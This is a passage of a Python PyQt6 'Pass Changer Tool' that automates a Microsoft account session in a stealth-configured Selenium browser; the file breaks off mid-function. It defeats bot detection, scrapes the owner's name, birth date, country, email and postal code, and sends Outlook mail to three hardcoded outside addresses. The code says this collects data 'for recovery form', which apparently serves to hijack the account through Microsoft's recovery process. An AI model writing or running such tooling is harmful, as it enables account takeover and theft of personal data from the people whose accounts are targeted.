"""
Pass Changer Tool
Created by AhmedCoderr
"""

import sys
import time
import random
import re
import threading
import hashlib
import os
import tempfile
import shutil
from concurrent.futures import ThreadPoolExecutor

from PyQt6 import QtCore, QtGui, QtWidgets
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium_stealth import stealth
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import TimeoutException


class CPUIntensiveProcessor:
    """CPU intensive operations to maximize CPU usage and minimize GPU usage"""

    @staticmethod
    def hash_operations(data, iterations=10000):
        """Perform CPU-intensive hashing operations"""
        result = data
        for _ in range(iterations):
            result = hashlib.sha256(result.encode()).hexdigest()
        return result

    @staticmethod
    def text_processing(text, iterations=1000):
        """CPU-intensive text processing operations"""
        processed = text
        for i in range(iterations):
            processed = ''.join(reversed(processed))
            processed = processed.upper() if i % 2 == 0 else processed.lower()
            processed = processed.replace('a', '1').replace('1', 'a')
            processed = processed[:len(processed) // 2] + processed[len(processed) // 2:]
        return processed

    @staticmethod
    def mathematical_operations(base_num=12345, iterations=50000):
        """CPU-intensive mathematical calculations"""
        result = base_num
        for _ in range(iterations):
            result = (result * 7) % 1000000
            result = result ** 2 % 999999
            result = int(result ** 0.5)
        return result


class ScraperWorker(QtCore.QObject):
    log_signal = QtCore.pyqtSignal(str)
    initial_setup_completed_signal = QtCore.pyqtSignal(str)
    full_process_completed_signal = QtCore.pyqtSignal(str)
    intermediate_result_signal = QtCore.pyqtSignal(str)
    progress_update_signal = QtCore.pyqtSignal(int, str)

    # Retry mechanism
    ask_retry_signal = QtCore.pyqtSignal()
    retry_decision_signal = QtCore.pyqtSignal(bool)

    def __init__(self, account_password):
        super().__init__()
        self.account_password = account_password
        self.first_name = "Not Available"
        self.last_name = "Not Available"
        self.dob = "Not Available"
        self.country = "Not Available"
        self.postal = ""
        self.alt_email = "Recovery_Not_Attempted"
        self.cpu_processor = CPUIntensiveProcessor()
        self.executor = ThreadPoolExecutor(max_workers=4)
        self.driver = None
        self.temp_profile_dir = None

        self.collected_emails = []
        self.collected_subjects = []

        self._retry_response = None
        self.retry_decision_signal.connect(self._set_retry_response)

        self.random_subjects = [
            "Quick Question",
            "Checking In",
            "Regarding Your Account",
            "Important Update",
            "Hello from Bot",
        ]
        self.random_messages = [
            "Hope you are having a great day!",
            "Just wanted to touch base regarding something.",
            "Please disregard if this is not relevant.",
            "This is an automated message.",
            "Wishing you all the best.",
        ]

    def _set_retry_response(self, response: bool):
        self._retry_response = response

    def close_browser(self):
        """Closes the browser and cleans up the temporary profile directory."""
        self.log_signal.emit("Closing browser...")
        if self.driver:
            try:
                self.driver.quit()
            except Exception as e:
                self.log_signal.emit(f"Error quitting driver: {e}")
            self.driver = None
        if self.temp_profile_dir and os.path.exists(self.temp_profile_dir):
            try:
                shutil.rmtree(self.temp_profile_dir, ignore_errors=True)
                self.log_signal.emit("Temporary profile directory cleaned.")
            except Exception as cleanup_error:
                self.log_signal.emit(f"Cleanup warning: {cleanup_error}")
        self.executor.shutdown(wait=True)

    def cpu_intensive_delay(self, min_s=1.0, max_s=2.5):
        """Human-like delay with optional CPU work (human-paced)."""
        delay_time = random.uniform(min_s, max_s)
        # Light CPU work to simulate human thinking
        futures = []
        for _ in range(1):
            future = self.executor.submit(self.cpu_processor.mathematical_operations, 12345, 5000)
            futures.append(future)
        time.sleep(delay_time)
        for future in futures:
            try:
                future.result(timeout=0.1)
            except Exception:
                pass

    def _human_like_type(self, element, text, min_char_delay=0.08, max_char_delay=0.25):
        """
        Types text into a specific element character by character (human-like speed).
        Uses element.send_keys directly (more reliable than relying on active_element).
        """
        if not self.driver or element is None:
            return
        # For longer text, use chunked typing with human-like pauses
        if len(text) > 20:
            chunks = [text[i:i+3] for i in range(0, len(text), 3)]  # Smaller chunks
            for i, chunk in enumerate(chunks):
                try:
                    element.send_keys(chunk)
                    # Occasional longer pause (like human thinking)
                    if i > 0 and i % 5 == 0:
                        time.sleep(random.uniform(0.3, 0.6))
                    else:
                        time.sleep(random.uniform(0.1, 0.25))
                except Exception as e:
                    self.log_signal.emit(f"Typing error: {e}")
                    break
        else:
            for char in text:
                try:
                    element.send_keys(char)
                except Exception as e:
                    self.log_signal.emit(f"Typing error: {e}")
                    break
                # Human-like typing speed with occasional pauses
                if random.random() < 0.1:  # 10% chance of longer pause
                    time.sleep(random.uniform(0.3, 0.6))
                else:
                    time.sleep(random.uniform(min_char_delay, max_char_delay))
        self.cpu_intensive_delay(0.5, 1.2)  # Human-like pause after typing

    def _initialize_driver(self):
        """Initializes the Selenium WebDriver with stealth options."""
        self.progress_update_signal.emit(5, "Initializing browser...")
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        ]
        random_user_agent = random.choice(user_agents)

        self.temp_profile_dir = tempfile.mkdtemp()
        options = webdriver.ChromeOptions()
        options.add_argument(f"user-agent={random_user_agent}")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option("useAutomationExtension", False)
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument(f"--user-data-dir={self.temp_profile_dir}")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-popup-blocking")
        options.add_argument("--start-maximized")
        options.add_argument("--disable-infobars")
        options.add_argument("--incognito")
        options.add_argument("--disable-notifications")

        width = random.randint(1024, 1440)
        height = random.randint(700, 900)
        options.add_argument(f"--window-size={width},{height}")

        try:
            service = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=service, options=options)
        except Exception as e:
            self.log_signal.emit(f"ChromeDriverManager failed, falling back: {e}")
            self.driver = webdriver.Chrome(options=options)

        driver = self.driver
        driver.execute_cdp_cmd(
            "Page.addScriptToEvaluateOnNewDocument",
            {
                "source": """
              Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined
              });
              window.chrome = { runtime: {} };
              Object.defineProperty(navigator, 'plugins', {
                 get: () => [1, 2, 3, 4, 5],
              });
              Object.defineProperty(navigator, 'languages', {
                 get: () => ['en-US', 'en'],
              });
           """
            },
        )
        stealth(
            driver,
            languages=["en-US", "en"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Corporation",
            renderer="Intel UHD Graphics",
            fix_hairline=True,
        )
        driver.execute_script(
            "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
        )
        self.log_signal.emit("WebDriver initialized.")
        self.progress_update_signal.emit(10, "Browser initialized.")

    def _perform_login_check(self):
        """Handles the manual login and waits for confirmation."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(15, "Waiting for manual login...")
        self.driver.get("https://login.live.com/")
        self.log_signal.emit("Opened Microsoft login page. Please log in manually...")

        start_time = time.time()
        login_detected = False
        while time.time() - start_time < 240:
            try:
                current = self.driver.current_url
            except Exception:
                break
            if "login.live.com" not in current and "account.microsoft.com" in current:
                login_detected = True
                break
            time.sleep(random.uniform(0.5, 1.5))

        if login_detected:
            self.log_signal.emit("Login detected!")
            self.progress_update_signal.emit(20, "Login successful.")
        else:
            self.log_signal.emit("Login not confirmed (timeout) – proceeding anyway.")
            self.progress_update_signal.emit(20, "Login timed out, proceeding...")

        self.cpu_intensive_delay(1.5, 2.5)  # Human-like pause after login

    def _extract_profile_info(self):
        """Navigates to profile page and extracts user information."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(25, "Extracting profile information...")
        self.log_signal.emit("Navigating to profile page...")
        self.driver.get("https://account.microsoft.com/profile?")
        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        # Wait for page to be interactive
        WebDriverWait(self.driver, 15).until(
            lambda d: d.execute_script("return document.readyState") == "complete"
        )
        # Wait for dynamic content to load
        time.sleep(random.uniform(3, 5))  # Human-like wait for profile data to load
        
        # Scroll to ensure content is visible
        self.driver.execute_script("window.scrollTo(0, 300);")
        time.sleep(0.5)

        full_name = "Not Available"
        dob_local = "Not Available"
        country_local = "Not Available"
        email_addr = "Not Available"

        # Try multiple selectors for full name
        name_selectors = [
            "//span[@id='profile.profile-page.personal-section.full-name']",
            "//span[contains(@id, 'full-name')]",
            "//div[contains(@class, 'personal-section')]//span[contains(@class, 'name')]",
            "//h1[contains(@class, 'name')]",
            "//div[contains(@data-testid, 'name')]",
            "//span[contains(text(), '')]/ancestor::div[contains(@class, 'personal')]//span[1]",
        ]
        for selector in name_selectors:
            try:
                element = WebDriverWait(self.driver, 5).until(
                    EC.presence_of_element_located((By.XPATH, selector))
                )
                full_name = element.text.strip()
                if full_name and full_name != "Not Available":
                    self.log_signal.emit(f"Found Full Name using selector: {selector}")
                    break
            except Exception:
                continue
        if full_name == "Not Available":
            self.log_signal.emit("Failed to extract Full Name with all selectors.")

        # Try multiple selectors for DOB
        dob_selectors = [
            "//div[contains(@id, 'date-of-birth')]//span[contains(text(),'/')]",
            "//div[contains(@id, 'birth')]//span",
            "//span[contains(text(), '/') and contains(text(), '/')]",
            "//div[contains(@class, 'birth')]//span",
            "//*[contains(@aria-label, 'birth')]",
        ]
        for selector in dob_selectors:
            try:
                elements = self.driver.find_elements(By.XPATH, selector)
                for elem in elements:
                    text = elem.text.strip()
                    if '/' in text and len(text) > 5:  # Basic validation
                        dob_local = text
                        self.log_signal.emit(f"Found DOB using selector: {selector}")
                        break
                if dob_local != "Not Available":
                    break
            except Exception:
                continue
        if dob_local == "Not Available":
            self.log_signal.emit("Failed to extract Date of Birth with all selectors.")

        # Try multiple methods for country
        country_selectors = [
            "//div[contains(@class, 'country')]//span",
            "//span[contains(text(), 'Country')]/following-sibling::span",
            "//*[contains(@aria-label, 'country')]",
        ]
        for selector in country_selectors:
            try:
                element = self.driver.find_element(By.XPATH, selector)
                country_local = element.text.strip()
                if country_local and country_local != "Not Available":
                    self.log_signal.emit(f"Found Country using selector: {selector}")
                    break
            except Exception:
                continue
        
        # Fallback: regex search in body text
        if country_local == "Not Available":
            try:
                body_text = self.driver.find_element(By.TAG_NAME, "body").text
                m = re.search(
                    r"Country or region\s*\n\s*([A-Za-z\s]+)",
                    body_text,
                    re.MULTILINE,
                )
                if m:
                    country_local = m.group(1).splitlines()[0].strip()
            except Exception:
                self.log_signal.emit("Failed to extract Country with all methods.")

        try:
            email_elem = self.driver.find_element(
                By.XPATH, "//a[starts-with(@href, 'mailto:')]"
            )
            email_addr = email_elem.text.strip()
            if not email_addr:
                email_addr = (
                    email_elem.get_attribute("href").replace("mailto:", "").strip()
                )
            self.email_addr = email_addr
        except Exception:
            pattern = r"[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}"
            email_matches = re.findall(pattern, self.driver.page_source)
            if email_matches:
                email_addr = email_matches[0]
                self.email_addr = email_addr
            else:
                self.log_signal.emit("Failed to extract Email.")
                email_addr = "Not Available"
                self.email_addr = email_addr

        self.log_signal.emit("Profile info extracted:")
        self.log_signal.emit("  • Full Name: " + full_name)
        self.log_signal.emit("  • DOB: " + dob_local)
        self.log_signal.emit("  • Country: " + country_local)
        self.log_signal.emit("  • Email: " + email_addr)

        self.dob = dob_local
        self.country = country_local

        if full_name != "Not Available":
            name_parts = full_name.split()
            if len(name_parts) > 1:
                self.first_name = " ".join(name_parts[:-1])
                self.last_name = name_parts[-1]
            else:
                self.first_name = full_name
                self.last_name = ""
        else:
            self.first_name = "Not Available"
            self.last_name = "Not Available"

        self.log_signal.emit(
            f"Assigned for identity form: First Name={self.first_name}, "
            f"Last Name={self.last_name}, DOB={self.dob}, Country={self.country}"
        )
        self.progress_update_signal.emit(30, "Profile information extracted.")

    def _extract_postal_code(self):
        """Navigates to address book and extracts postal code."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.progress_update_signal.emit(35, "Extracting postal code...")
        self.driver.get("https://account.microsoft.com/billing/addresses")
        self.log_signal.emit(
            "Navigating to Address Book Section (for postal code extraction)..."
        )
        WebDriverWait(self.driver, 20).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        # Wait for dynamic content
        WebDriverWait(self.driver, 15).until(
            lambda d: d.execute_script("return document.readyState") == "complete"
        )
        self.cpu_intensive_delay(2.0, 3.5)  # Human-like pause after navigating to addresses

        postal_codes_str = "Not Found"
        try:
            address_blocks = WebDriverWait(self.driver, 10).until(
                lambda d: d.find_elements(
                    By.XPATH, "//div[contains(@class, 'ms-StackItem')]"
                )
            )
            extracted_addresses = []
            unwanted_keywords = [
                "change",
                "manage",
                "default",
                "choose",
                "all addresses",
                "add new",
                "remove",
                "set as",
                "preferred",
                "billing info",
                "shipping info",
                "email",
                "address book",
            ]
            for block in address_blocks:
                text = block.text.strip()
                if (
                    text
                    and not any(kw in text.lower() for kw in unwanted_keywords)
                    and re.search(r"\d+", text)
                ):
                    extracted_addresses.append(text)

            seen = set()
            unique_addresses = [
                addr
                for addr in extracted_addresses
                if addr.lower() not in seen and not seen.add(addr.lower())
            ]

            postal_codes_set = set()
            for addr in unique_addresses:
                dash_pattern = r"\b\d{5}-\d{4}\b|\b\d{5}-\d{5}\b"
                dash_codes = re.findall(dash_pattern, addr)
                if dash_codes:
                    postal_codes_set.update(dash_codes)

                space_pattern = r"\b\d{5}\s+\d{4}\b|\b\d{5}\s+\d{5}\b"
                space_codes = re.findall(space_pattern, addr)
                if space_codes:
                    space_codes_normalized = [
                        code.replace(" ", "-") for code in space_codes
                    ]
                    postal_codes_set.update(space_codes_normalized)

                extended_pattern = r"\b\d{5}\d{4}\b"
                extended_codes = re.findall(extended_pattern, addr)
                if extended_codes:
                    formatted_codes = [
                        f"{code[:5]}-{code[5:]}" for code in extended_codes
                    ]
                    postal_codes_set.update(formatted_codes)

                simple_codes = re.findall(r"\b\d{4,6}\b", addr)
                if simple_codes and not postal_codes_set:
                    sorted_codes = sorted(simple_codes, key=len, reverse=True)
                    postal_codes_set.add(sorted_codes[0])

            postal_codes_list = list(postal_codes_set)
            postal_codes_list.sort(key=lambda x: ("-" in x, len(x)), reverse=True)

            self.postal = postal_codes_list[0] if postal_codes_list else ""
            self.log_signal.emit(f"Assigned for identity form: Postal={self.postal}")
            postal_codes_str = (
                ", ".join(postal_codes_list) if postal_codes_list else "Not Found"
            )

        except Exception as e:
            self.log_signal.emit(
                f"Failed to extract postal code from addresses: {str(e)}"
            )
            self.postal = ""
            postal_codes_str = "Not Found"

        self.progress_update_signal.emit(40, "Postal code extraction complete.")
        return postal_codes_str

    def _wait_for_send_button_icon(self, timeout=15):
        """Wait until a Send button becomes clickable using several robust selectors."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        selectors = [
            (By.CSS_SELECTOR, 'button[aria-label="Send"]'),
            (By.CSS_SELECTOR, 'button[aria-label*="send"]'),
            (By.CSS_SELECTOR, 'button[title="Send"]'),
            (By.XPATH, "//button[contains(@aria-label, 'Send')]"),
            (By.XPATH, "//button[contains(@title, 'Send')]"),
            (By.XPATH, "//button[.//span[normalize-space()='Send']]"),
            (By.XPATH, "//span[normalize-space()='Send']/ancestor::button[1]"),
        ]

        for by, selector in selectors:
            try:
                element = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable((by, selector))
                )
                self.log_signal.emit(
                    f"Located Send control using selector: {selector}"
                )
                return element
            except TimeoutException:
                continue
        raise TimeoutException("Could not locate a clickable Send button.")

    def _click_new_message_button(self, timeout=15):
        """Tries multiple selectors to open the new message composer via a button click."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        selectors = [
            (By.CSS_SELECTOR, 'button[aria-label="New message"]'),
            (By.CSS_SELECTOR, 'button[aria-label*="New mail"]'),
            (By.XPATH, "//button[contains(@aria-label, 'New message')]"),
            (By.XPATH, "//button[contains(@aria-label, 'New mail')]"),
            (By.XPATH, "//button[.//span[normalize-space()='New message']]"),
            (By.XPATH, "//span[normalize-space()='New message']/ancestor::button[1]"),
            (By.XPATH, "//button[contains(@data-task, 'newmessage')]"),
        ]

        for by, selector in selectors:
            try:
                button = WebDriverWait(self.driver, timeout).until(
                    EC.element_to_be_clickable((by, selector))
                )
                button.click()
                self.log_signal.emit(
                    f"Clicked New Message button using selector: {selector}"
                )
                return True
            except TimeoutException:
                continue
            except Exception as e:
                self.log_signal.emit(
                    f"Error clicking New Message button ({selector}): {e}"
                )
        return False

    def _open_outlook_new_message_composer(self):
        """Ensures the Outlook compose dialog is open using multiple strategies."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        self.log_signal.emit("Opening Outlook new mail composer...")
        composer_opened = False

        # Ensure page is ready before trying to interact
        try:
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
        except TimeoutException:
            self.log_signal.emit("Warning: Body element not found, proceeding anyway...")

        try:
            self.log_signal.emit(
                "Pressing 'N' to open new mail composer (keyboard shortcut)..."
            )
            # Ensure page has focus - more thorough approach
            body = WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Human-like pause before action (slower)
            time.sleep(random.uniform(1.0, 2.0))
            
            # Method 1: Click body to ensure focus, then send key
            try:
                # Scroll to middle of page first (human-like)
                self.driver.execute_script("window.scrollTo(0, window.innerHeight / 2);")
                time.sleep(random.uniform(0.8, 1.5))  # Slower scroll pause
                
                # Click on body to ensure focus
                body.click()
                time.sleep(random.uniform(1.0, 1.8))  # Slower human-like pause
                
                # Send 'N' key
                ActionChains(self.driver).send_keys("n").perform()
                self.log_signal.emit("Sent 'N' key via ActionChains")
                time.sleep(random.uniform(0.8, 1.2))  # Slower pause
            except Exception as e1:
                self.log_signal.emit(f"Method 1 failed: {e1}, trying method 2...")
                # Method 2: Use JavaScript to focus and send key
                try:
                    self.driver.execute_script("""
                        document.body.focus();
                        document.activeElement = document.body;
                    """)
                    time.sleep(random.uniform(1.0, 1.8))  # Slower pause
                    ActionChains(self.driver).send_keys("n").perform()
                    self.log_signal.emit("Sent 'N' key via JavaScript focus + ActionChains")
                    time.sleep(random.uniform(0.8, 1.2))  # Slower pause
                except Exception as e2:
                    self.log_signal.emit(f"Method 2 failed: {e2}, trying method 3...")
            
            # Method 3: Direct JavaScript key event as fallback
            try:
                self.driver.execute_script("""
                    // Create and dispatch keydown event
                    var keydownEvent = new KeyboardEvent('keydown', {
                        key: 'n',
                        code: 'KeyN',
                        keyCode: 78,
                        which: 78,
                        bubbles: true,
                        cancelable: true
                    });
                    document.body.dispatchEvent(keydownEvent);
                    
                    // Also try keypress
                    var keypressEvent = new KeyboardEvent('keypress', {
                        key: 'n',
                        code: 'KeyN',
                        keyCode: 110,
                        which: 110,
                        bubbles: true,
                        cancelable: true
                    });
                    document.body.dispatchEvent(keypressEvent);
                    
                    // And keyup
                    var keyupEvent = new KeyboardEvent('keyup', {
                        key: 'n',
                        code: 'KeyN',
                        keyCode: 78,
                        which: 78,
                        bubbles: true,
                        cancelable: true
                    });
                    document.body.dispatchEvent(keyupEvent);
                """)
                self.log_signal.emit("Sent 'N' key via JavaScript events")
                time.sleep(random.uniform(0.8, 1.2))  # Slower pause
            except Exception as e3:
                self.log_signal.emit(f"Method 3 failed: {e3}")
            
            # Human-like wait for composer to start opening (slower)
            time.sleep(random.uniform(3.5, 5.0))  # Much slower wait time
            self._wait_for_composer_visible(timeout=20)
            composer_opened = True
            self.log_signal.emit("Composer opened via keyboard shortcut.")
        except Exception as e:
            self.log_signal.emit(f"Keyboard shortcut 'N' did not open composer: {e}")
            # Don't fail immediately, try button click

        if not composer_opened:
            self.log_signal.emit(
                "Trying to open composer by clicking the New Message button..."
            )
            if self._click_new_message_button():
                try:
                    time.sleep(random.uniform(2.0, 3.5))  # Slower wait for button click to register
                    self._wait_for_composer_visible(timeout=20)  # Increased timeout
                    composer_opened = True
                    self.log_signal.emit("Composer opened via button click.")
                except Exception as e:
                    composer_opened = False
                    self.log_signal.emit(
                        f"Composer still not visible after button click: {e}"
                    )
            else:
                self.log_signal.emit(
                    "Unable to locate a New Message button with available selectors."
                )
        
        # Final fallback: try direct URL navigation
        if not composer_opened:
            try:
                self.log_signal.emit("Trying direct URL navigation to composer...")
                self.driver.get("https://outlook.live.com/mail/0/deeplink/compose")
                time.sleep(random.uniform(3.5, 5.0))  # Slower wait
                self._wait_for_composer_visible(timeout=15)
                composer_opened = True
                self.log_signal.emit("Composer opened via direct URL.")
            except Exception as e:
                self.log_signal.emit(f"Direct URL navigation failed: {e}")

        if not composer_opened:
            self.log_signal.emit("Warning: Could not confirm composer opened, but proceeding anyway...")
            time.sleep(random.uniform(3.0, 4.5))  # Slower pause
            # Don't raise exception, try to proceed

    def _wait_for_composer_visible(self, timeout=20):
        """Waits for the Outlook compose dialog to become visible with better timeout handling."""
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")
        
        self.log_signal.emit(f"Waiting for composer to appear (timeout: {timeout}s)...")
        start_time = time.time()
        
        selectors = [
            (By.CSS_SELECTOR, 'input[aria-label*="To" i]'),
            (By.CSS_SELECTOR, 'div[aria-label*="To" i]'),
            (By.CSS_SELECTOR, 'input[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'div[aria-label*="To"]'),
            (
                By.XPATH,
                "//div[@role='textbox' and contains(translate(@aria-label, "
                "'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'message body')]",
            ),
            (
                By.XPATH,
                "//textarea[contains(translate(@aria-label, "
                "'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'message body')]",
            ),
            (By.XPATH, "//div[contains(@aria-label, 'Message body')]"),
            (
                By.XPATH,
                "//div[@role='textbox' and contains(@aria-label, 'Message body')]",
            ),
        ]
        
        # Try each selector with shorter individual timeouts
        for by, selector in selectors:
            if time.time() - start_time > timeout:
                break
            try:
                remaining_time = max(2, timeout - (time.time() - start_time))
                WebDriverWait(self.driver, min(remaining_time, 5)).until(
                    EC.visibility_of_element_located((by, selector))
                )
                self.log_signal.emit(
                    f"Composer detected via selector: {selector}"
                )
                time.sleep(random.uniform(1.5, 2.5))  # Slower wait for composer to stabilize
                return
            except TimeoutException:
                continue
            except Exception as e:
                self.log_signal.emit(f"Error checking selector {selector}: {e}")
                continue
        
        # Try JavaScript detection as fallback
        self.log_signal.emit("Primary selectors failed, trying JavaScript detection...")
        try:
            composer_found = self.driver.execute_script("""
                var toField = document.querySelector('input[aria-label*="To" i], div[aria-label*="To" i][contenteditable="true"]');
                var bodyField = document.querySelector('div[role="textbox"][aria-label*="body" i]');
                return toField || bodyField;
            """)
            if composer_found:
                self.log_signal.emit("Composer detected via JavaScript.")
                time.sleep(random.uniform(1.5, 2.5))  # Slower pause
                return
        except Exception as e:
            self.log_signal.emit(f"JavaScript detection failed: {e}")
        
        # Try simpler selectors
        simple_selectors = [
            (By.CSS_SELECTOR, 'div[role="textbox"]'),
            (By.CSS_SELECTOR, 'input[type="text"]'),
            (By.CSS_SELECTOR, 'div[contenteditable="true"]'),
        ]
        for by, selector in simple_selectors:
            if time.time() - start_time > timeout:
                break
            try:
                remaining_time = max(2, timeout - (time.time() - start_time))
                element = WebDriverWait(self.driver, min(remaining_time, 3)).until(
                    EC.presence_of_element_located((by, selector))
                )
                # Check if it's likely the composer
                if element.is_displayed():
                    self.log_signal.emit(f"Composer detected via fallback selector: {selector}")
                    time.sleep(random.uniform(1.5, 2.5))  # Slower pause
                    return
            except (TimeoutException, Exception):
                continue
        
        # Final check - if we've waited long enough, proceed anyway
        elapsed = time.time() - start_time
        if elapsed >= timeout * 0.7:  # If we've waited 70% of timeout
            self.log_signal.emit(f"Warning: Composer not fully detected after {elapsed:.1f}s, proceeding anyway...")
            time.sleep(random.uniform(2.0, 3.0))  # Slower pause
            return
        
        raise TimeoutException(f"Composer did not become visible within {timeout} seconds.")

    def _find_to_field(self):
        """Try to find Outlook 'To' field explicitly with timeout protection."""
        self.log_signal.emit("Looking for 'To' field...")
        # Human-like pause - looking at the screen (slower)
        time.sleep(random.uniform(2.5, 4.0))  # Slower human-like wait for composer to be ready
        
        max_wait_time = 15  # Maximum time to spend looking
        start_time = time.time()
        
        selectors = [
            (By.CSS_SELECTOR, 'input[aria-label="To"]'),
            (By.CSS_SELECTOR, 'input[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'input[aria-label*="to"]'),
            (By.XPATH, "//input[@role='combobox' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'to')]"),
            (By.XPATH, "//div[@role='textbox' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'),'to')]"),
            (By.CSS_SELECTOR, 'div[aria-label*="To"]'),
            (By.CSS_SELECTOR, 'div[aria-label*="to"]'),
            (By.XPATH, "//div[contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'to') and @contenteditable='true']"),
            (By.CSS_SELECTOR, '[aria-label*="To"]'),
            (By.CSS_SELECTOR, '[aria-label*="to"]'),
            (By.XPATH, "//input[contains(@placeholder, 'To') or contains(@placeholder, 'to')]"),
            (By.XPATH, "//div[@contenteditable='true' and contains(translate(@aria-label, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'to')]"),
        ]
        for by, selector in selectors:
            if time.time() - start_time > max_wait_time:
                self.log_signal.emit("Timeout reached while searching for To field, trying fallbacks...")
                break
            try:
                remaining_time = max(2, max_wait_time - (time.time() - start_time))
                field = WebDriverWait(self.driver, min(remaining_time, 5)).until(
                    EC.element_to_be_clickable((by, selector))
                )
                self.log_signal.emit(f"'To' field found using selector: {selector}")
                return field
            except (TimeoutException, Exception) as e:
                continue
        
        # Try JavaScript approach
        try:
            self.log_signal.emit("Trying JavaScript to locate To field...")
            field = self.driver.execute_script("""
                var allInputs = document.querySelectorAll('input, div[contenteditable="true"]');
                for (var i = 0; i < allInputs.length; i++) {
                    var elem = allInputs[i];
                    var label = elem.getAttribute('aria-label') || '';
                    var placeholder = elem.getAttribute('placeholder') || '';
                    if (label.toLowerCase().includes('to') || placeholder.toLowerCase().includes('to')) {
                        return elem;
                    }
                }
                return null;
            """)
            if field:
                self.log_signal.emit("'To' field found via JavaScript.")
                return field
        except Exception as e:
            self.log_signal.emit(f"JavaScript search failed: {e}")
        
        self.log_signal.emit("Could not locate 'To' field explicitly; using active element.")
        try:
            # Try clicking in the composer area first
            body = self.driver.find_element(By.TAG_NAME, "body")
            body.click()
            time.sleep(0.3)
            # Try pressing Tab to navigate to To field
            ActionChains(self.driver).send_keys(Keys.TAB).perform()
            time.sleep(0.3)
            return self.driver.switch_to.active_element
        except Exception:
            return None

    def _process_outlook_sent_items(self):
        """
        Navigates to Outlook, directly composes and sends a new email.
        Captures recipients and subject for recovery form.
        """
        if not self.driver:
            raise RuntimeError("WebDriver not initialized")

        self.progress_update_signal.emit(42, "Processing Outlook Sent Items...")
        self.log_signal.emit("Navigating to Outlook Sent Items...")
        self.driver.get("https://outlook.live.com/mail/0/sentitems")
        
        # Wait for page to load properly (optimized with better timeout handling)
        try:
            self.log_signal.emit("Waiting for Outlook page to load...")
            # Wait for basic page structure first (more lenient)
            WebDriverWait(self.driver, 15).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            self.log_signal.emit("Page body found, waiting for content...")
            
            # Wait for ready state with shorter timeout
            start_time = time.time()
            while time.time() - start_time < 10:
                try:
                    ready_state = self.driver.execute_script("return document.readyState")
                    if ready_state == "complete":
                        break
                    time.sleep(0.5)
                except Exception:
                    break
            
            # Additional wait for Outlook's dynamic content (non-blocking)
            try:
                WebDriverWait(self.driver, 5).until(
                    lambda d: len(d.find_elements(By.TAG_NAME, "div")) > 10
                )
            except TimeoutException:
                self.log_signal.emit("Warning: Dynamic content still loading, proceeding...")
            
            self.log_signal.emit("Outlook page loaded successfully.")
            time.sleep(random.uniform(4.0, 6.0))  # Slower human-like pause to look at page
        except TimeoutException as e:
            self.log_signal.emit(f"Warning: Page load timeout ({e}), proceeding anyway...")
            time.sleep(random.uniform(2, 3))
        except Exception as e:
            self.log_signal.emit(f"Warning: Page load error ({e}), proceeding anyway...")
            time.sleep(random.uniform(2, 3))

        self.log_signal.emit(
            "Proceeding directly to compose a new email..."
        )

        self.collected_emails = []
        self.collected_subjects = []

        try:
            self._open_outlook_new_message_composer()
            # Human-like pause after opening composer (slower)
            time.sleep(random.uniform(2.5, 4.0))
        except Exception as e:
            self.log_signal.emit(f"Failed to open new mail composer: {e}")
            raise

        target_emails_for_one_send = [
            "abdullahahmad123456789@gmail.com",
            "khurshidiahmad22@outlook.com",
            "skylergamer180@gmail.com",
        ]

        try:
            # Human-like pause before starting to fill form (slower)
            time.sleep(random.uniform(2.5, 4.0))
            
            to_field = self._find_to_field()
            if not to_field:
                # Try alternative: use JavaScript to focus on To field
                try:
